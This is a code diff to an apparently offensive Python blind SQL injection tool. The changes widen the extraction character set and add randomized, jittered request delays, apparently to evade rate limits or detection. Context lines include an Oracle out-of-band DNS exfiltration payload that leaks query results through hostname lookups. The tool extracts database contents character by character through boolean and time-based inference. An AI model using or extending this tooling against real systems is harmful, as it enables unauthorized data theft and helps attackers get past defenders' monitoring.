@@ -1,9 +1,13 @@
-import re, time, json, string, concurrent.futures, math
-from typing import Optional, Dict, List, Tuple, Callable
+import concurrent.futures
+import random
+import re
+import string
+import time
 from enum import Enum
+from typing import Dict, List, Optional, Tuple
 
-from tools.log_utils import get_logger
 from tools.http_client import build_url
+from tools.log_utils import get_logger
 from tools.settings import settings
 from tools.verification_oracle import ConfidenceVoter
 
@@ -93,7 +97,7 @@ OOB_DNS_PAYLOADS = {
     "oracle": "SELECT UTL_INADDR.GET_HOST_ADDRESS(CONCAT((SELECT %s FROM DUAL),'.%s')) FROM DUAL",
 }
 
-QUERY_CHARSET = string.digits + string.ascii_lowercase + '.-_@/: '
+QUERY_CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + '.-_@/: '
 
 DEFAULT_QUERIES = {
     "version": "VERSION()",
@@ -233,6 +237,7 @@ class BlindInjector:
         self.tech: Optional[BlindTech] = None
         self.classifier = ResponseClassifier(self.sess, timeout)
         self.baseline_time = 0.0
+        self._req_counter = 0
 
     def _auto_detect_dbms(self, url: str, param: str) -> Optional[str]:
         for dbms in ["mysql", "mssql", "postgresql", "oracle"]:
@@ -285,6 +290,12 @@ class BlindInjector:
             return sum(times) / len(times)
         return 0.3
 
+    def _rate_limit(self):
+        self._req_counter += 1
+        time.sleep(random.uniform(0.05, 0.15))
+        if self._req_counter % 50 == 0:
+            time.sleep(1.5)
+
     def _extract_char_bool(self, url: str, param: str, query: str,
                            pos: int, charset: str = QUERY_CHARSET) -> Optional[str]:
         if self.dbms not in BOOL_TEMPLATES:
@@ -293,6 +304,7 @@ class BlindInjector:
 
         lo, hi = 0, len(charset) - 1
         while lo <= hi:
+            self._rate_limit()
             mid = (lo + hi) // 2
             test_char = charset[mid]
             try:
@@ -334,6 +346,7 @@ class BlindInjector:
 
         lo, hi = 0, len(charset) - 1
         while lo <= hi:
+            self._rate_limit()
             mid = (lo + hi) // 2
             test_char = charset[mid]
 
@@ -349,6 +362,7 @@ class BlindInjector:
             if elapsed >= sleep_dur * 0.7:
                 lo = mid + 1
             else:
+                self._rate_limit()
                 eq_payload = eq_tpl % (query, pos, test_char, sleep_dur)
                 try:
                     start = time.time()
